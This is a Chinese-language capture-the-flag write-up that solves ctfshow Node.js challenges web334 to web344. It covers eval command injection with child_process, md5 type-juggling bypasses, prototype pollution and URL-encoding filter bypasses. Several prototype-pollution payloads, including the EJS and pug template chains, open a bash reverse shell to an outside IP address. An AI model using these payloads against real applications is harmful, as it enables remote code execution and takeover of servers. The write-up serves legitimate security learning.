

## 命令执行

### web334

login.js

```js
var express = require('express'); // 引入express模块
var router = express.Router();
var users = require('../modules/user').items; // 引入modules下的user.js
 
var findUser = function(name, password){
  return users.find(function(item){
    return name!=='CTFSHOW' && item.username === name.toUpperCase() && item.password === password;
  }); //toUpperCase()是javascript中将小写转换成大写的函数
};

/* GET home page. */
router.post('/', function(req, res, next) { 
  res.type('html'); //设置响应内容为html
  var flag='flag_here';
  var sess = req.session;
  var user = findUser(req.body.username, req.body.password);
 
  if(user){
    req.session.regenerate(function(err) {
      if(err){
        return res.json({ret_code: 2, ret_msg: '登录失败'});        
      }
       
      req.session.loginUser = user.username;
      res.json({ret_code: 0, ret_msg: '登录成功',ret_flag:flag});              
    });
  }else{
    res.json({ret_code: 1, ret_msg: '账号或密码错误'});
  }  
  
});

module.exports = router;
```

user.js

```js
module.exports = {
  items: [
    {username: 'CTFSHOW', password: '123456'}
  ]
};

// 这段代码是一个模块文件，通过module.exports将一个对象导出
```

payload

```
ctfshow
123456
登录就行
```

### web335

查看源码

![image-20240322122922266](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240322122922266.png)

发现有个eval参数，eval函数可以执行命令，那这一题就是要命令注入了

payload

```js
require('child_process').execSync('ls')
require('child_process').execSync('cat fl00g.txt')
require('child_process').execSync('cat fl*').toString()
```

```js
require('child_process').spawnSync('ls').stdout.toString()
require('child_process').spawnSync('ls',['.']).stdout.toString()
require('child_process').spawnSync('ls',['./']).stdout.toString()
require('child_process').spawnSync('cat',['fl00g.txt']).stdout.toString() //不能用通配符
```

### web336

`过滤了/exec|load/i`

payload

```js
require("child_process")['exe'%2B'cSync']('ls')  //拼接绕过
require('child_process').spawnSync('ls').stdout.toString()
require('child_process').spawnSync('ls',['.']).stdout.toString()
require('child_process').spawnSync('ls',['./']).stdout.toString()
require('child_process').spawnSync('cat',['fl00g.txt']).stdout.toString() //不能用通配符
```

### web337

给了源码

```js
var express = require('express');
var router = express.Router();
var crypto = require('crypto');

function md5(s) {
  return crypto.createHash('md5')
    .update(s)
    .digest('hex');
}

/* GET home page. */
router.get('/', function(req, res, next) {
  res.type('html');
  var flag='xxxxxxx';
  var a = req.query.a;
  var b = req.query.b;
  if(a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag)){
  	res.end(flag);
  }else{
  	res.render('index',{ msg: 'tql'});
  }
  
});

module.exports = router;
```

```js
if(a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag))
```

payload

```
?a[c]=1&b[c]=2
```

```
> crypto.createHash('md5').update(a+'123').digest('hex');
'48f823cf3792a401f42d1633c4b8ca4d'
> crypto.createHash('md5').update(b+'123').digest('hex');
'48f823cf3792a401f42d1633c4b8ca4d'
```

```
?a[]=1&b=1
```

> `['a']+flag= = ='a'+flag`，比如flag是flag{123}，那么最后得到的都是`aflag[123}`，因此这个也肯定成立：`md5(['a']+flag)= = =md5('a'+flag)`，同时也满足a!==b

> `?a[0]=1&b[0]=2 不行`
>
> 但是如果传`a[0]=1&b[0]=2`，相当于创了个变量`a=[1] b=[2]`，再像上面那样打印的时候，`会打印出1flag{xxx}和2flag{xxx}`，md5不相等

## 原型链污染

### web338

给了源码

login.js

```javascript
var express = require('express');
var router = express.Router();
var utils = require('../utils/common');



/* GET home page.  */
router.post('/', require('body-parser').json(),function(req, res, next) {
  res.type('html');
  var flag='flag_here';
  var secert = {};
  var sess = req.session;
  let user = {};
  utils.copy(user,req.body);
  if(secert.ctfshow==='36dboy'){
    res.end(flag);
  }else{
    return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)});  
  }
  
  
});

module.exports = router;
```

common.js

```javascript
module.exports = {
  copy:copy
};

function copy(object1, object2){
    for (let key in object2) {
        if (key in object2 && key in object1) {
            copy(object1[key], object2[key])
        } else {
            object1[key] = object2[key]
        }
    }
  }
```

这个copy函数就是将对象进行递归合并

payload

```
Content-Type: application/json

{"username":"2","password":"2","__proto__":{"ctfshow":"36dboy"}}
```



![image-20240322133415404](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240322133415404.png)

### web339

给了源码

login.js

```javascript
router.post('/', require('body-parser').json(),function(req, res, next) {
  res.type('html');
  var flag='flag_here';
  var secert = {};
  var sess = req.session;
  let user = {};
  utils.copy(user,req.body);
  if(secert.ctfshow===flag){
    res.end(flag);
  }else{
    return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)});  
  }
});
```

common.js

```javascript
module.exports = {
  copy:copy
};

function copy(object1, object2){
    for (let key in object2) {
        if (key in object2 && key in object1) {
            copy(object1[key], object2[key])
        } else {
            object1[key] = object2[key]
        }
    }
  }
```

api.js

```javascript
var express = require('express');
var router = express.Router();
var utils = require('../utils/common');



/* GET home page.  */
router.post('/', require('body-parser').json(),function(req, res, next) {
  res.type('html');
  res.render('api', { query: Function(query)(query)});
    // 通过 res.render() 方法渲染名为 'api' 的视图模板，并传递一个包含 query 属性的对象作为参数。这里使用了 Function(query) 来创建一个函数，并立即调用该函数并传递 query 作为参数。这样做可能是为了在视图模板中使用 query 变量。
   
});

module.exports = router;
```

payload

```json
{"__proto__":{"query":"return global.process.mainModule.constructor._load('child_process').exec('bash -c \"bash -i >& /dev/tcp/119.3.125.218/1234 0>&1\"')"}}
```

查看login.js

![image-20240322144733780](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240322144733780.png)



### web340

login.js

```javascript
var express = require('express');
var router = express.Router();
var utils = require('../utils/common');


/* GET home page.  */
router.post('/', require('body-parser').json(),function(req, res, next) {
  res.type('html');
  var flag='flag_here';
  var user = new function(){
    this.userinfo = new function(){
    this.isVIP = false;
    this.isAdmin = false;
    this.isAuthor = false;     
    };
  }
  utils.copy(user.userinfo,req.body);
  if(user.userinfo.isAdmin){
   res.end(flag);
  }else{
   return res.json({ret_code: 2, ret_msg: '登录失败'});  
  }
  
  
});

module.exports = router;
```

api.js

```javascript
/* GET home page.  */
router.post('/', require('body-parser').json(),function(req, res, next) {
  res.type('html');
  res.render('api', { query: Function(query)(query)});
   
});
```

变化的部分

```javascript
var user = new function(){
    this.userinfo = new function(){
    this.isVIP = false;
    this.isAdmin = false;
    this.isAuthor = false;     
    };
  }
  utils.copy(user.userinfo,req.body);
  if(user.userinfo.isAdmin){ // user.userinfo.isAdmin的值是false，不能通过原型链污染类改变，所以这里不可能输出flag
   res.end(flag);
  }else{
   return res.json({ret_code: 2, ret_msg: '登录失败'});  
  }
```

就算修改了`Object`的`isAdmin`，因为`user.userinfo`里有`isAdmin`,所以不会向上寻找

子类不能污染父类已经存在的属性，只能新增属性。

所以这里构造`query`属性

> 这里需要污染两层
>
> user.userinfo的上级是user，user的上级才是Object

payload

```json
{"__proto__":{"__proto__":{"query":"return global.process.mainModule.constructor._load('child_process').exec('bash -c \"bash -i >& /dev/tcp/119.3.125.218/1234 0>&1\"')"}}
```

### web341

先下一个叫snyk的工具

> ```
> npm install -g snyk
> ```
>
> ```
> snyk auth
> ```
>
> ```
> snyk test
> ```

![image-20240324162648063](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240324162648063.png)

[Snyk 依赖性安全漏洞扫描工具](https://blog.csdn.net/weixin_42176112/article/details/116654787)

有个ejs的rce漏洞

payload

```json
{"__proto__":{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/119.3.125.218/1234 0>&1\"');var __tmp2"}}}
```

![image-20240324162805916](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240324162805916.png)



### web342，343

payload

参考链接`https://xz.aliyun.com/t/7025`

```json
{"__proto__":{"__proto__": {"type":"Block","nodes":"","compileDebug":1,"self":1,"line":"global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/xxx/810>&1\"')"}}}
```

### web344

```javascript
router.get('/', function(req, res, next) {
  res.type('html');
  var flag = 'flag_here';
  if(req.url.match(/8c|2c|\,/ig)){
  	res.end('where is flag :)');
  }
  var query = JSON.parse(req.query.query);
  if(query.name==='admin'&&query.password==='ctfshow'&&query.isVIP===true){
  	res.end(flag);
  }else{
  	res.end('where is flag. :)');
  }

});
```

`var query = JSON.parse(req.query.query)`获取一个query参数

payload

```
query={"name":"admin","password":"ctfshow","isVIP":true}
```

但是过滤了逗号

```
query={"name":"admin"&query="password":"ctfshow"&query="isVIP":true}
```

还过滤了2c，这里双引号的url编码是%22，和c字符组成了%22c，被过滤了，把c字符进行url编码

```
query={"name":"admin"&query="password":"%63tfshow"&query="isVIP":true}
```

